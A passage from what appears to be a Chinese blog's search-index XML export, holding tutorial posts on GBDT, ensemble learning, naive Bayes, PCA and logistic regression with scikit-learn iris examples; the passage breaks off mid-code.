tree)刘建平Pinard-决策树算法原理(上)忆臻-通俗理解决策树算法中的信息增益python 决策树算法]]></content>
      <categories>
        <category>机器学习</category>
        <category>决策树</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>决策树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GBDT梯度提升树介绍]]></title>
    <url>%2Farchives%2F7b6c662f.html</url>
    <content type="text"><![CDATA[GBDT(Gradient Boosting Decision Tree) ,又叫 MART（Multiple Additive Regression Tree)，是一种迭代的决策树算法，该算法由多棵决策树组成，所有树的结论累加起来做最终答案。它在被提出之初就和SVM一起被认为是泛化能力较强的算法。GBDT中的树是回归树（不是分类树），GBDT用来做回归预测，调整后也可以用于分类。决策树分为两大类，回归树和分类树。回归树用于预测实数值，如明天的温度、用户的年龄、网页的相关程度；分类树用于分类标签值，如晴天/阴天/雾/雨、用户性别、网页是否是垃圾页面。这里要强调的是，回归树的结果加减是有意义的，如10岁+5岁-3岁=12岁，分类树则无意义，如男+男+女=到底是男是女？回归树1、回归树原理简介先说分类树，我们知道C4.5分类树在每次分枝时，是穷举每一个特征的每一个阈值，找到使得按照特征&lt;=阈值和特征&gt;阈值分成的两个分枝的熵最大的特征和阈值（熵最大的概念可理解成尽可能每个分枝的男女比例都远离1:1），按照该标准分枝得到两个新节点，用同样方法继续分枝直到所有人都被分入性别唯一的叶子节点，或达到预设的终止条件，若最终叶子节点中的性别不唯一，则以多数人的性别作为该叶子节点的性别。回归树（Regression Decision Tree）总体流程类似于分类树，区别在于，回归树的每一个节点都会得一个预测值，以年龄为例，该预测值等于属于这个节点的所有人年龄的平均值。分枝时穷举每一个特征的每个阈值找最好的分割点，但衡量最好的标准不再是最大熵，而是最小化平方误差。也就是被预测出错的人数越多，错的越离谱，平方误差就越大，通过最小化平方误差能够找到最可靠的分枝依据。分枝直到每个叶子节点上人的年龄都唯一（这太难了）或者达到预设的终止条件(如叶子个数上限)，若最终叶子节点上人的年龄不唯一，则以该节点上所有人的平均年龄做为该叶子节点的预测年龄。2、回归树示例下面是一个示例数据集：面积/平米价格/万2040.12140.33570.43670.2(1)、选择最优特征按特征&quot;面积&quot; = 20划分数据集：y1 均值为40.1y2 均值为(40.3 + 70.4 + 70.2) / 3 = 60.3平方误差为：0 + (40.3 – 60.3)*2 + (70.4 – 60.3)*2 + (70.2 – 60.3)*2= 600.02按特征&quot;面积&quot; = 21划分数据集：y1 均值为(40.1 + 40.3)/ 2 = 40.2y2 均值为(70.4 + 70.2) / 2 = 70.3平方误差为：(40.1 –40.2)*2 + (40.3 –40.2)*2 + (70.4 –70.3)*2 +(70.2 –70.3)*2 = 0.04按特征&quot;面积&quot; = 35划分数据集：y1 均值为(40.1 + 40.3 + 70.4) / 3 = 50.27y2 均值为70.2平方误差为：(40.1 –50.27)*2 + (40.3 –50.27)*2 + (70.4 –50.27)*2 + 0 = 608.05综上所述，由于按特征&quot;面积&quot; = 21 比特征&quot;面积&quot; = 20、&quot;面积&quot; = 35划分的平方误差小，所以特征&quot;面积&quot; = 21为切分点。(2)、按最优特征划分数据集以特征&quot;面积&quot; = 21为切分点，将数据切分为{面积 = 20,价格 = 40.1; 面积 = 21, 价格 = 40.3}， {面积 = 35,价格 = 70.4; 面积 = 36, 价格 = 70.2}两个子集。其中子集{面积 = 20,价格 = 40.1; 面积 = 21, 价格 = 40.3}的目标变量非常接近，故不继续划分，得叶节点值(40.1 + 40.3) / 2 = 40.2； 同理得子集{面积 = 35,价格 = 70.4; 面积 = 36, 价格 = 70.2}的叶节点值为 (70.4 + 70.2) / 2 = 70.3。梯度提升树算法梯度提升树（Gradient Boosting Decision Tree）是迭代多棵回归树来共同决策。当采用平方误差损失函数时，每一棵回归树学习的是之前所有树的结论和残差，拟合得到一个当前的残差回归树，残差的意义如公式：残差 = 真实值 - 预测值。提升树即是整个迭代过程生成的回归树的累加。1、小例子在这个例子里，我们通过传统的回归决策树和梯度提升树两种方式来预测年龄。训练集是4个人，A，B，C，D，年龄分别是14，16，24，26。样本中有购物金额、上网时长、经常到百度知道提问等特征。如果是用一棵传统的回归决策树来训练，会得到如下图所示结果：现在我们使用梯度提升树来做这件事，由于数据太少，我们限定叶子节点做多有两个，即每棵树都只有一个分枝，并且限定只学两棵树。我们会得到如下图所示结果：该例子很直观的能看到，梯度提升树的预测值等于所有树值得累加，如A的预测值 = 树1左节点 值 15 + 树2左节点 -1 = 14。2、Gradient体现在哪里那么哪里体现了Gradient呢？其实回到第一棵树结束时想一想，无论此时的cost function是什么，是均方差还是均差，只要它以误差作为衡量标准，残差向量(-1, 1, -1, 1)都是它的全局最优方向，这就是Gradient。3、为何需要GBDT既然传统的回归决策树和GBDT最终效果相同，为何还需要GBDT呢？答案是过拟合。过拟合是指为了让训练集精度更高，学到了很多仅在训练集上成立的规律，导致换一个数据集当前规律就不适用了。其实只要允许一棵树的叶子节点足够多，训练集总是能训练到100%准确率的（大不了最后一个叶子上只有一个instance)。在训练精度和实际精度（或测试精度）之间，后者才是我们想要真正得到的。我们发现传统的回归决策树为了达到100%精度使用了3个特征（上网时长、时段、网购金额），其中分枝“上网时长&gt;1.1h” 很显然已经过拟合了。相对来说，GBDT虽然用了两棵树 ，但其实只用了2个特征就搞定了，后一个特征是问答比例，其分枝依据更合乎逻辑（当然这里是相比较于上网时长特征而言）。4、GBDT适用范围GBDT 可以适用于回归问题（线性和非线性），相对于 logistic regression 仅能用于线性回归，GBDT 适用面更广。GBDT 也可用于二分类问题（设定阈值，大于为正，否则为负）和多分类问题。参考GBDT学习笔记苏冉旭-GBDT（MART） 迭代决策树入门教程 | 简介CART 树简介]]></content>
      <categories>
        <category>机器学习</category>
        <category>决策树</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>决策树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[集成学习原理小结]]></title>
    <url>%2Farchives%2Fa2665b86.html</url>
    <content type="text"><![CDATA[集成学习(ensemble learning)可以说是现在非常火爆的机器学习方法了。它本身不是一个单独的机器学习算法，而是通过构建并结合多个机器学习器来完成学习任务。也就是我们常说的“博采众长”。集成学习可以用于分类问题集成，回归问题集成，特征选取集成，异常点检测集成等等，可以说所有的机器学习领域都可以看到集成学习的身影。本文就对集成学习的原理做一个总结。一、集成学习概述从下图，我们可以对集成学习的思想做一个概括。对于训练集数据，我们通过训练若干个个体学习器，通过一定的结合策略，就可以最终形成一个强学习器，以达到博采众长的目的。也就是说，集成学习有两个主要的问题需要解决，第一是如何得到若干个个体学习器，第二是如何选择一种结合策略，将这些个体学习器集合成一个强学习器。二、集成学习之个体学习器上一节我们讲到，集成学习的第一个问题就是如何得到若干个个体学习器。这里我们有两种选择。第一种就是所有的个体学习器都是一个种类的，或者说是同质的。比如都是决策树个体学习器，或者都是神经网络个体学习器。第二种是所有的个体学习器不全是一个种类的，或者说是异质的。比如我们有一个分类问题，对训练集采用支持向量机个体学习器，逻辑回归个体学习器和朴素贝叶斯个体学习器来学习，再通过某种结合策略来确定最终的分类强学习器。目前来说，同质个体学习器的应用是最广泛的，一般我们常说的集成学习的方法都是指的同质个体学习器。而同质个体学习器使用最多的模型是CART决策树和神经网络。同质个体学习器按照个体学习器之间是否存在依赖关系可以分为两类：第一个是个体学习器之间存在强依赖关系，一系列个体学习器基本都需要串行生成，代表算法是boosting系列算法。第二个是个体学习器之间不存在强依赖关系，一系列个体学习器可以并行生成，代表算法是bagging和随机森林（Random Forest）系列算法。下面就分别对这两类算法做一个概括总结。三、集成学习之boostingboosting的算法原理我们可以用一张图做一个概括如下：从图中可以看出，Boosting算法的工作机制是首先从训练集用初始权重训练出一个弱学习器1，根据弱学习的学习误差率表现来更新训练样本的权重，使得之前弱学习器1学习误差率高的训练样本点的权重变高，使得这些误差率高的点在后面的弱学习器2中得到更多的重视。然后基于调整权重后的训练集来训练弱学习器2，如此重复进行，直到弱学习器数达到事先指定的数目T，最终将这T个弱学习器通过集合策略进行整合，得到最终的强学习器。Boosting系列算法里最著名算法主要有AdaBoost算法和提升树(boosting tree)系列算法。提升树系列算法里面应用最广泛的是梯度提升树(Gradient Boosting Tree)。AdaBoost和提升树算法的原理在后面的文章中会专门来讲。四、集成学习之baggingBagging的算法原理和 boosting不同，它的弱学习器之间没有依赖关系，可以并行生成，我们可以用一张图做一个概括如下：从上图可以看出，bagging的个体弱学习器的训练集是通过随机采样得到的。通过T次的随机采样，我们就可以得到T个采样集，对于这T个采样集，我们可以分别独立的训练出T个弱学习器，再对这T个弱学习器通过集合策略来得到最终的强学习器。对于这里的随机采样有必要做进一步的介绍，这里一般采用的是自助采样法（Bootstrap sampling），即对于m个样本的原始训练集，我们每次先随机采集一个样本放入采样集，接着把该样本放回，也就是说下次采样时该样本仍有可能被采集到，这样采集m次，最终可以得到m个样本的采样集，由于是随机采样，这样每次的采样集是和原始训练集不同的，和其他采样集也是不同的，这样得到多个不同的弱学习器。随机森林是bagging的一个特化进阶版，所谓的特化是因为随机森林的弱学习器都是决策树。所谓的进阶是随机森林在bagging的样本随机采样基础上，又加上了特征的随机选择，其基本思想没有脱离bagging的范畴。bagging和随机森林算法的原理在后面的文章中会专门来讲。五、集成学习之结合策略在上面几节里面我们主要关注于学习器，提到了学习器的结合策略但没有细讲，本节就对集成学习之结合策略做一个总结。我们假定我得到的T个弱学习器是${h_1,h_2,…h_T}$1、平均法对于数值类的回归预测问题，通常使用的结合策略是平均法，也就是说，对于若干个弱学习器的输出进行平均得到最终的预测输出。最简单的平均是算术平均，也就是说最终预测是$$H(x) = \frac{1}{T}\sum\limits_{1}^{T}h_i(x)$$如果每个个体学习器有一个权重w，则最终预测是$$H(x) = \sum\limits_{i=1}^{T}w_ih_i(x)$$其中$w_i$是个体学习器$h_i$的权重，通常有$$w_i \geq 0 ,\;\;\; \sum\limits_{i=1}^{T}w_i = 1$$2、投票法对于分类问题的预测，我们通常使用的是投票法。假设我们的预测类别是${c_1,c_2,…c_K}$,对于任意一个预测样本x，我们的T个弱学习器的预测结果分别是$(h_1(x), h_2(x)…h_T(x))$。最简单的投票法是相对多数投票法，也就是我们常说的少数服从多数，也就是T个弱学习器的对样本x的预测结果中，数量最多的类别ci为最终的分类类别。如果不止一个类别获得最高票，则随机选择一个做最终类别。稍微复杂的投票法是绝对多数投票法，也就是我们常说的要票过半数。在相对多数投票法的基础上，不光要求获得最高票，还要求票过半数。否则会拒绝预测。更加复杂的是加权投票法，和加权平均法一样，每个弱学习器的分类票数要乘以一个权重，最终将各个类别的加权票数求和，最大的值对应的类别为最终类别。3、学习法上两节的方法都是对弱学习器的结果做平均或者投票，相对比较简单，但是可能学习误差较大，于是就有了学习法这种方法，对于学习法，代表方法是stacking，当使用stacking的结合策略时， 我们不是对弱学习器的结果做简单的逻辑处理，而是再加上一层学习器，也就是说，我们将训练集弱学习器的学习结果作为输入，将训练集的输出作为输出，重新训练一个学习器来得到最终结果。在这种情况下，我们将弱学习器称为初级学习器，将用于结合的学习器称为次级学习器。对于测试集，我们首先用初级学习器预测一次，得到次级学习器的输入样本，再用次级学习器预测一次，得到最终的预测结果。以上就是集成学习原理的一个总结，后面会分别对Adaboost, 提升树，bagging和随机森林的算法原理做一个总结，敬请期待。本文转载于：刘建平Pinard-集成学习原理小结]]></content>
      <categories>
        <category>机器学习</category>
        <category>集成学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>集成学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机器学习笔记汇总]]></title>
    <url>%2Farchives%2F97bf4f4.html</url>
    <content type="text"><![CDATA[机器学习算法是一类从数据中自动分析获得规律，并利用规律对未知数据进行预测的算法。一个更精确的定义：如果计算机程序对于任务 T 的性能度量 P 通过经验 E 得到了提高，则认为此程序对经验 E 进行了学习。为了便于理解，这里我整理了常见机器学习算法的通俗解释。机器学习算法分类机器学习可以分成监督学习与无监督学习：监督学习从给定的训练数据集中学习出一个函数，当新的数据到来时，可以根据这个函数预测结果。监督学习的训练集要求是包括输入和输出，也可以说是特征和目标。训练集中的目标是由人标注的。常见的监督学习算法包括回归分析和统计分类。监督学习和非监督学习的差别就是训练集目标是否人标注。监督学习线性回归线性回归介绍和Python实现逻辑回归逻辑回归介绍朴素贝叶斯朴素贝叶斯介绍决策树决策树介绍随机森林通俗解释GBDT梯度提升树介绍上面的随机森林和GBDT其实是用了集成学习，通过构建并结合多个机器学习器来完成学习任务。集成学习原理可以见：集成学习原理小结无监督学习无监督学习的简要介绍：什么是无监督学习？常见的无监督学习算法有聚类：KMeans聚类算法层次聚类算法然后还有一个非常经典的无监督降维算法——主成分分析法：PCA通俗解释机器学习评价指标评价指标是机器学习任务中非常重要的一环。不同的机器学习任务有着不同的评价指标，同时同一种机器学习任务也有着不同的评价指标，每个指标的着重点不一样。详细见：机器学习评价指标]]></content>
      <categories>
        <category>机器学习</category>
        <category>总结</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[朴素贝叶斯介绍]]></title>
    <url>%2Farchives%2F4b7871b.html</url>
    <content type="text"><![CDATA[贝叶斯分类是一类分类算法的总称，这类算法均以贝叶斯定理为基础，故统称为贝叶斯分类。而朴素朴素贝叶斯分类是贝叶斯分类中最简单，也是常见的一种分类方法。一、分类的数学描述$C=y_{1}, y_{2}, \dots . y_{m}$：类别集合，每个y是一个类别$I=x_{1}, x_{2}, \dots . x_{n}$：项集合，每个x是一个待分类项，每个待分类项有若干个特征构造一个f，使得$y_{i}=f(x_{i})$，其中f就是分类器。二、贝叶斯定理贝叶斯定理实际上就是计算”条件概率”的公式。条件概率（Conditional Probability）是指在事件B发生的情况下，事件A发生的概率，用P(A|B)表示，读作在B条件下的A的概率。根据文氏图，可以很清楚地看到在事件B发生的情况下，事件A发生的概率就是P(A∩B)除以P(B)。$$P(A | B)=\frac{P(A \cap B)}{P(B)}$$同时，P(A∩B)又可以由$P(A \cap B)=P(B | A) P(A)$表示，然后我们就可以推得贝叶斯公式：$$P(A | B)=\frac{P(B | A) P(A)}{P(B)}$$贝叶斯定理之所以有用，是因为我们在生活中经常遇到这种情况：我们可以很容易直接得出P(A|B)，P(B|A)则很难直接得出，但我们更关心P(B|A)，贝叶斯定理就为我们打通从P(A|B)获得P(B|A)的道路。在分类任务中，我们可以把贝叶斯定理换一个更清楚的形式：$$P(类别 | 特征)=\frac{P(特征 | 类别) P(类别)}{P(特征)}$$三、朴素贝叶斯分类器1、小例子训练样本的属性集为$X={性别，年龄，婚姻}$，类别为$Y={Yes,No}$，表示是否购买产品，训练样本共有10条记录，购买记录有4条，不购买记录有6条。下面是具体的数据集：性别(A)年龄(B)婚姻状况(C)是否购买(Y)M小未婚YesF中已婚NoF小未婚YesM大已婚NoM中离异NoM中未婚YesF大已婚NoM大未婚YesF大未婚NoF中已婚No现在给定一个测试样本X′为性别=F,年龄=中,婚姻=离异，预测该用户是否会购买公司的产品。因此，我们需要计算概率：$$\left { \begin{aligned} &amp; P(Y=Yes|性别=F,年龄=中,婚姻=离异) \ &amp; P(Y=No|性别=F,年龄=中,婚姻=离异) \end{aligned} \right.$$根据贝叶斯定理：$$\begin{aligned} P_1 &amp;= P(Y=Yes|性别=F,年龄=中,婚姻=离异) \ &amp;= \frac{P(性别=F,年龄=中,婚姻=离异 | Y=Yes) P(Y=Yes)}{P(性别=F,年龄=中,婚姻=离异)} \ &amp;= \frac{P(性别=F|Yes) P(年龄=中|Yes) P(婚姻=离异|Yes) P(Y=Yes)}{P(性别=F) P(年龄=中) P(婚姻=离异)} \end{aligned}$$同时我们知道$$\left{ \begin{aligned} &amp; P(Y=Yes) = 4/10 \ &amp; P(性别=F|Yes) = 1/4 \ &amp; P(年龄=中|Yes) = 1/4 \ &amp; P(婚姻=离异|Yes) = 0 \ \end{aligned} \right.$$我们可以求得$P(Y=Yes|性别=F,年龄=中,婚姻=离异)$为：$$\begin{aligned} P_1 &amp;= \frac{1}{4} \times \frac{1}{4} \times 0 \times \frac{4}{10} / \alpha = 0 \end{aligned}$$同理我们可以求得$P(Y=No|性别=F,年龄=中,婚姻=离异)$为：$$\begin{aligned} P_2 &amp;= \frac{4}{6} \times \frac{3}{6} \times \frac{1}{6} \times \frac{6}{10} / \alpha = 0.033 / \alpha \end{aligned}$$其中$\alpha = P(性别=F) P(年龄=中) P(婚姻=离异)$。由于$P_1 &lt; P_2$，根据朴素贝叶斯算法，我们给出NO。2、朴素贝叶斯算法的朴素一词解释朴素贝叶斯算法是假设各个特征之间相互独立。正是这个特征之间相互独立的假设，使得上面那个例子可以把P(Y=Yes|性别=F,年龄=中,婚姻=离异)拆分成P(性别=F|Yes) P(年龄=中|Yes) P(婚姻=离异|Yes)。为什么需要假设特征之间相互独立呢？假如没有这个假设，那么我们对右边这些概率的估计其实是不可做的，我们这个例子有三个特征，其中性别包括{M，F}，年龄包括{大，中，小}，婚姻状态包括{未婚，已婚}，那么三个特征的联合概率分布总共是三维空间，总个数为2*3*2=12个。但是现实生活中，往往有非常多的特征，每一个特征的取值也是非常之多，那么我们统计的时候，就需要在整个特征空间中去找，比如统计P(性别=F,年龄=中,婚姻=离异∣Y=Yes)，我们就需要在YES的条件下，去找三种特征全满足的人的个数，这样的话，由于数据的稀疏性，很容易统计到0的情况。3、拉普拉斯校准当某个类别下某个特征项划分没有出现时，比如例子里的P(婚姻=离异|Yes)=0就是产生这种现象，这会令分类器质量大大降低。为了解决这个问题，我们引入Laplace校准，它的思想非常简单，就是对每类别下所有划分的计数加1，这样如果训练样本集数量充分大时，并不会对结果产生影响，并且解决了上述频率为0的尴尬局面。4、朴素贝叶斯算法优缺点优点：朴素贝叶斯模型发源于古典数学理论，有稳定的分类效率对小规模的数据表现很好，能个处理多分类任务，适合增量式训练，尤其是数据量超出内存时，我们可以一批批的去增量训练对缺失数据不太敏感，算法也比较简单，常用于文本分类缺点：理论上，朴素贝叶斯模型与其他分类方法相比具有最小的误差率。但是实际上并非总是如此，这是因为朴素贝叶斯模型给定输出类别的情况下，假设属性之间相互独立，这个假设在实际应用中往往是不成立的，在属性个数比较多或者属性之间相关性较大时，分类效果不好。而在属性相关性较小时，朴素贝叶斯性能最为良好。对于这一点，有半朴素贝叶斯之类的算法通过考虑部分关联性适度改进需要知道先验概率，且先验概率很多时候取决于假设，假设的模型可以有很多种，因此在某些时候会由于假设的先验模型的原因导致预测效果不佳由于我们是通过先验和数据来决定后验的概率从而决定分类，所以分类决策存在一定的错误率对输入数据的表达形式很敏感四、参考带你理解朴素贝叶斯分类算法算法杂货铺——分类算法之朴素贝叶斯分类(Naive Bayesian classification)朴素贝叶斯的那点事儿贝叶斯分类器（上）刘建平Pinard-朴素贝叶斯算法原理小结]]></content>
      <categories>
        <category>机器学习</category>
        <category>分类</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>分类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PCA通俗解释]]></title>
    <url>%2Farchives%2F8aecd656.html</url>
    <content type="text"><![CDATA[主成分分析（Principal Component Analysis，PCA）是非常经典的降维算法，属于无监督降维。一、为什么要进行PCA桌子那边有一些红酒瓶。我们可以通过色泽、酒精度、年份等描述每瓶红酒。这样可以根据酒窖中每瓶红酒的不同特性编制一张完整的列表。但是其中很多属性是相关的，因此会出现一些冗余。因此我们可以通过更少的特性总结每瓶酒！这正是PCA做的。PCA并没有选择一些特性然后丢弃其余。相反，它创建一些新特性，结果这些新特性能够很好地总结我们的红酒列表。当然，这些新特性是由旧特性构建的；例如，一个新特性可能通过计算年份减去酸度或其它类似的组合得出（我们称之为线性组合）。1、新特征具体是什么第一个答案是你寻找一些在所有红酒中很不相同的属性（特性）。红酒和红酒很不一样，如果你得到了一个对于大多数红酒而言都一样的特性，那么它们看起来都差不多了，这肯定是一个错误的总结。相反，PCA寻找能尽可能体现红酒差异的属性。第二个答案是你寻找一些属性，这些属性允许你预测，或者说“重建”原本的红酒特性。同样，如果你得出了一个和原本的特性没什么关系的属性；那么仅仅使用这一新属性，你不可能重建原本的特性，这又将是一个不好的总结。所以PCA寻找能够尽可能好地重建原本特性的属性。注意：这两个目标是等效的。2、为什么这两个目标是等效的下面我们看一个二维数据降维成一维的例子：红点：原始数据集绿点：降维后的数据集紫线 u1 ：二维的特征 x1, x2 降维后的一维特征（此时为最佳）蓝线：投影（降维）造成的损失第一个目标是寻找尽可能体现差异的属性，在这个图上就是最大化投影后数据的方差，让数据在经过变换后更加分散，也就是图中绿色的点更加分散。第二个目标是寻找能够尽可能好地重建原本特性的属性，在这个图上就是最小化投影造成的损失，也就是图中所有蓝色的线（投影造成的损失）加起来最小。参考如何通俗易懂地讲解什么是 PCA 主成分分析？]]></content>
      <categories>
        <category>机器学习</category>
        <category>降维</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>降维</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[逻辑回归介绍]]></title>
    <url>%2Farchives%2F2a97a967.html</url>
    <content type="text"><![CDATA[逻辑回归(Logistic Regression, LR)模型其实仅在线性回归的基础上，套用了一个逻辑函数。因此，LR模型可以被认为是一个被Sigmoid函数（logistic方程）所归一化后的线性回归模型。为什么需要逻辑回归首先要理解二分类问题，二分类问题是指预测的y值只有两个取值（0或1）。例如：我们要做一个垃圾邮件过滤系统，X(i)是邮件的特征，预测的y值就是邮件的类别，是垃圾邮件还是正常邮件。对于类别我们通常称为正类（positive class）和负类（negative class），垃圾邮件的例子中，正类就是正常邮件，负类就是垃圾邮件。如果我们继续使用线性回归来预测y的取值。这样做会导致y的取值并不为0或1。逻辑回归使用一个函数来归一化y值，使y的取值在区间(0,1)内，称为Sigmoid函数：$$g(z)=\frac{1}{1+e^{-z}}$$当z趋近于无穷大时，g(z)趋近于1；当z趋近于无穷小时，g(z)趋近于0。Sigmoid图形如下：&#123;cmd123456789101112131415import matplotlib.pyplot as pltimport numpy as npdef sigmoid(x): return 1. / (1. + np.exp(-x)) x = np.arange(-10, 10, 0.1)y = sigmoid(x)plt.plot(x, y)plt.axvline(0.0,ls = 'dotted', color='k')plt.title(r'Sigmoid函数曲线', fontsize = 15)plt.text(5,0.8,r'$y = \frac&#123;1&#125;&#123;1+e^&#123;-z&#125;&#125;$', fontsize = 18)plt.show()这里我们发现，函数中z无论取什么值，其结果y都在[0,-1]的区间内，回想一下，一个分类问题就有两种答案，一种是“是”，一种是“否”，那0对应着“否”，1对应着“是”，那又有人问了，你这不是[0,1]的区间吗，怎么做到只有0和1呢？我们可以假设分类的阈值是0.5，超过0.5的归为1分类，低于0.5的归为0分类。阈值是可以自己设定的。下面参考：逻辑回归 logistics regression 公式推导我们不能直接拿了sigmoid函数就用，毕竟它连要训练的参数 $\theta$ 都没。我们结合sigmoid函数，线性回归函数，把线性回归模型的输出作为sigmoid函数的输入。于是最后就变成了逻辑回归模型：$$y=g(f({x}))=g\left({\theta}^{T} {x}\right)=\frac{1}{1+e^{-{\theta}^{T} {x}}}$$假设我们已经训练好了一组权值 $\theta^T$ 。只要把我们需要预测的 $\theta^T$ 代入到上面的方程，输出的y值就是这个标签为A的概率，我们就能够判断输入数据是属于哪个类别。损失函数逻辑回归的损失函数如下所示：$$\operatorname{cost}\left(h_{\theta}(x), y\right)=\left{\begin{array}{cc}{-\log \left(h_{\theta}(x)\right)} &amp; {\text { if } y=1} \ {-\log \left(1-h_{\theta}(x)\right)} &amp; {\text { if } y=0}\end{array}\right.$$当真实值为1分类时，用第一个方程来表示损失函数；当真实值为0分类时，用第二个方程来表示损失函数，为什么要加上log函数呢？可以试想一下，当真实样本为1是，但h=0概率，那么log0=∞，这就对模型最大的惩罚力度；当h=1时，那么log1=0，相当于没有惩罚，也就是没有损失，达到最优结果。所以数学家就想出了用log函数来表示损失函数，把上述两式合并起来就是如下函数：$$\begin{aligned} J(\theta) &amp;=\frac{1}{m} \sum_{i=1}^{m} \operatorname{cost}\left(h_{\theta}\left(x^{(i)}\right), y^{(i)}\right) \ &amp;=-\frac{1}{m}\left[\sum_{i=1}^{m} y^{(i)} \log h_{\theta}\left(x^{(i)}\right)+\left(1-y^{(i)}\right) \log \left(1-h_{\theta}\left(x^{(i)}\right)\right)\right] \end{aligned}$$最后按照梯度下降法一样，求解极小值点，得到想要的模型效果。梯度下降梯度下降(Gradient Descent)又叫作最速梯度下降，是一种迭代求解的方法，通过在每一步选取使目标函数变化最快的一个方向调整参数的值来逼近最优值。基本步骤如下：选择下降方向（梯度方向，$\nabla {J(\theta)}$）选择步长，更新参数 $\theta^i = \theta^{i-1} - \alpha^i \nabla {J(\theta^{i-1})}$重复以上两步直到满足终止条件其中损失函数的梯度计算方法为：$$\frac{\partial{J}}{\partial{\theta}} = -\frac{1}{m}\sum_i (y^i - h_{\theta}\left(x^{(i)}\right))x^i$$沿梯度负方向选择一个较小的步长可以保证损失函数是减小的，另一方面，逻辑回归的损失函数是凸函数（加入正则项后是严格凸函数），可以保证我们找到的局部最优值同时是全局最优。为什么可以用梯度下降法？因为逻辑回归的损失函数L是一个连续的凸函数（conveniently convex）。这样的函数的特征是，它只会有一个全局最优的点，不存在局部最优。对于GD跟SGD最大的潜在问题就是它们可能会陷入局部最优。然而这个问题在逻辑回归里面就不存在了，因为它的损失函数的良好特性，导致它并不会有好几个局部最优。当我们的GD跟SGD收敛以后，我们得到的极值点一定就是全局最优的点，因此我们可以放心地用GD跟SGD来求解。逻辑回归的优势本部分参考：逻辑回归本质模型非常简单。应用到线上时，prediction的计算非常容易做。在O(1)的时间复杂度之内就能够给出模型的预测值，这对于线上数据暴风雨般袭来的时候非常有用。模型可解释性强。对于逻辑回归模型，每个特征$x_i$的参数$\theta_i$就是该特征的权重，$\theta_i$越大，则特征权重越大；越小，则特征权重越小。因此逻辑回归模型往往非常直观，而且容易debug，而且也容易手动修改。模型的输出平滑。由于Logistic function的作用，逻辑回归输出值是(0,1)之间的连续值，更重要的是，这个值能从某种角度上表示样本x是正例的可能性，输出值越接近1，则样本是正例的可能性就越大,输出值越接近0，样本是负例的可能性就越大。注意这里的用词，是样本x是正例的可能性，而不是样本x是正例的概率。多分类问题其实我们可以从二分类问题过度到多分类问题，有多种扩展逻辑回归使其成为多分类器的方法，比如One-Vs-All、One-Vs-One，下面简单介绍下One-Vs-All。One-Vs-AllOne-Vs-All（或者叫 One-Vs-Rest）的思想是把一个多分类的问题变成多个二分类的问题。将类型class1看作正样本，其他类型全部看作负样本，然后我们就可以得到样本标记类型为该类型的概率p1。然后再将另外类型class2看作正样本，其他类型全部看作负样本，同理得到p2。以此循环，我们可以得到该待预测样本的标记类型分别为类型class i时的概率pi，最后我们取pi中最大的那个概率对应的样本标记类型作为我们的待预测样本类型。逻辑回归建立步骤我们按照以下三个基本步骤，来分析和建立逻辑回归模型：构造假设函数（即 H 函数）构造损失函数（即 J 函数）通过某种方法使得损失函数最小，并求得此时的参数θsklearn实现逻辑回归1、简单实现&#123;cmd123456789101112131415161718192021222324252627282930313233343536from sklearn.datasets import load_iris from sklearn.linear_model import LogisticRegressionfrom sklearn.model_selection import train_test_splitimport matplotlib.pyplot as pltimport numpy as np# 加载数据集iris = load_iris()# 数据特征：150行， 4列features = iris['data']# 对应的鸢尾花种类: 150个，三种鸢尾花分别用 0,1,2 表示target = iris['target']# 自定义4个特征的名称feature_names = iris.feature_namesfeature_names = ['花萼长度', '花萼宽度', '花瓣长度', '花瓣宽度']# 自定义三种鸢尾花的名称class_names = iris.target_namesclass_names = ['山鸢尾花', '变色鸢尾花', '维吉尼亚鸢尾花']# 把样本分成训练集和测试集两部分, 两者比例为： 7:3X_train, X_test, y_train, y_test = train_test_split(features, target, test_size=0.3, random_state=42)# 训练lr = LogisticRegression() lr.fit(X_train, y_train)# 预测output = lr.predict(X_test) # 计算准确率acc = np.mean(output == y_test)*100print("The accuracy of the logistic regression classifier is: \t", acc, "%")1The accuracy of the logistic regression classifier is: 97.77777777777777 %2、可视化分类边界这里使用matplotlib下的pcolormesh()方法来直观表现出分类边界，有效解决了单纯的绘制散点图看不出分类的边界的问题。注：为了可视化，我仅取花萼长度和花萼宽度两个特征进行逻辑回归训练。&#123;cmd1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from sklearn.datasets import load_iris from sklearn.linear_model import LogisticRegressionfrom sklearn.model_selection import train_test_splitimport matplotlib.pyplot as pltimport matplotlib as mplimport numpy as np# 加载数据集iris = load_iris()# 数据特征：150行， 4列features = iris['data']# 对应的鸢尾花种类: 150个，三种鸢尾花分别用 0,1,2 表示target = iris['target']# 自定义4个特征的名称feature_names = iris.feature_namesfeature_names = ['花萼长度', '花萼宽度', '花瓣长度', '花瓣宽度']# 自定义三种鸢尾花的名称class_names = iris.target_namesclass_names = ['山鸢尾花', '变色鸢尾花', '维吉尼亚鸢尾花']# 这里仅取花萼长度和花萼宽度做特征X_train = features[:,:2]y_train = target# 训练lr = LogisticRegression() lr.fit(X_train, y_train)# 画出分类边界N, M = 500, 500 # 横纵各采样多少个值x1_min, x2_min = X_train.min(axis=0)x1_max, x2_max = X_train.max(axis=0)t1 = np.linspace(x1_min, x1_max, N)t2 = np.linspace(x2_min, x2_max, M)x1, x2 = np.meshgrid(t1, t2) # 生成网格采样点x_show = np.stack((x1.flat, x2.flat), axis=1) # 测试点y_predict=lr.predict(x_show)# 设置颜色cm_light = mpl.colors.ListedColormap(['#A0FFA0', '#FFA0A0', '#A0A0FF'])cm_dark = mpl.colors.ListedColormap(['g', 'r', 'b'])# 绘制出分类图plt.xlim(x1_min, x1_max)plt.ylim(x2_min, x2_max)plt.pcolormesh(x1, x2, 